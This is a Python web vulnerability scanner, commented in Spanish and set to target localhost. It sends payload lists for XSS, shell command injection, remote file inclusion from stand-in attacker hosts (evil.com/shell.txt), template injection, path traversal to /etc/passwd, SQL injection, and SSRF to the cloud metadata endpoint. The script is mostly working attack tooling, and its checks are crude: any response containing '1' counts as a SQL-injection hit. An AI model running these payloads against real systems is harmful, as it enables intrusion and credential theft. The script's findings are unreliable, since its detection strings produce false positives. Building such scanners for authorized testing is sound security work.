import requests
from bs4 import BeautifulSoup
import urllib.parse
import logging
from requests.exceptions import RequestException, Timeout

# Configuración de logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Configuración
TARGET_URL = 'http://127.0.0.1'  # URL objetivo

# Lista de posibles puntos de inyección para pruebas
ENDPOINTS = [
    '/', '/login', '/search', '/profile', '/upload'
]

# Payloads para inyección
PAYLOADS = {
    'xss': ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>'],
    'command_injection': ['; ls', '| ls', '&& ls'],
    'rfi': ['http://evil.com/shell.txt', 'http://malicious.com/malware.php'],
    'template_injection': ['{{7*7}}', '{{"".__class__.__mro__[2].__subclasses__()}}'],
    'ssjs': ['console.log(1)', 'process.exit()'],
    'directory_traversal': ['../../../../etc/passwd', '../../../../windows/system.ini'],
    'sql_injection': ["' OR '1'='1", '" OR "1"="1'],
    'ssrf': ['http://localhost:8080/admin', 'http://169.254.169.254/latest/meta-data/']
}

# Timeout para las solicitudes HTTP
TIMEOUT = 5

def send_request(url, params, method='GET'):
    try:
        if method == 'GET':
            response = requests.get(url, params=params, timeout=TIMEOUT)
        elif method == 'POST':
            response = requests.post(url, data=params, timeout=TIMEOUT)
        response.raise_for_status()
        return response
    except RequestException as e:
        logging.error(f'Error en la solicitud: {e}')
        return None

def test_injection(url, payloads, param_name, detection_strings, method='GET'):
    for payload in payloads:
        params = {param_name: payload}
        response = send_request(url, params, method)
        if response and any(ds in response.text for ds in detection_strings):
            logging.info(f'[{param_name.upper()}] Vulnerabilidad detectada en {url} con payload: {payload}')
            return True
    return False

def main():
    for endpoint in ENDPOINTS:
        url = urllib.parse.urljoin(TARGET_URL, endpoint)
        logging.info(f'Testando {url}')
        
        if test_injection(url, PAYLOADS['xss'], 'q', ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>']):
            continue
        if test_injection(url, PAYLOADS['command_injection'], 'cmd', ['bin', 'root']):
            continue
        if test_injection(url, PAYLOADS['rfi'], 'file', ['shell', 'malware']):
            continue
        if test_injection(url, PAYLOADS['template_injection'], 'template', ['49', 'subclasses']):
            continue
        if test_injection(url, PAYLOADS['ssjs'], 'input', ['1', 'exit']):
            continue
        if test_injection(url, PAYLOADS['directory_traversal'], 'file', ['root:', '[extensions]']):
            continue
        if test_injection(url, PAYLOADS['sql_injection'], 'id', ['1']):
            continue
        if test_injection(url, PAYLOADS['ssrf'], 'url', ['admin', 'meta-data']):
            continue

if __name__ == '__main__':
    main()
